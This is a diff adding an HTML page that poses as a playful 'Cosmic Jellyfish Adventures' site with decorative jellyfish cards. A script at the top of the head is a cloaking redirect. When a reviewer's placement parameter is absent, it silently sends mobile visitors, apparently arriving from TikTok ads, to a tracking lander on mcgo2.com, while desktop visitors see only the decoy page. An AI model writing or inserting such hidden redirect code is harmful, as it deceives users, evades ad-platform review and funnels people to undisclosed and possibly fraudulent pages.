@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF69B4, #00CED1);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #FF1493;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #FFFF00;
+            text-shadow: 2px 2px #FF4500;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .jellyfish-card {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            transform: rotate(5deg);
+        }
+        footer {
+            background-color: #4B0082;
+            color: #FFA500;
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+        }
+        a {
+            color: #00FF00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Cosmic Jellyfish Adventures!</h1>
+    </header>
+    <main>
+        <div class="jellyfish-card">
+            <h2>Sparkle Tentacle</h2>
+            <p>This jellyfish glows like a disco ball!</p>
+        </div>
+        <div class="jellyfish-card">
+            <h2>Nebula Floater</h2>
+            <p>Explore the galaxies with this space-faring jelly!</p>
+        </div>
+        <div class="jellyfish-card">
+            <h2>Rainbow Wobbler</h2>
+            <p>Watch it change colors as it bobs along!</p>
+        </div>
+    </main>
+    <footer>
+        <p>Copyright 2023 Cosmic Jellyfish Adventures | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
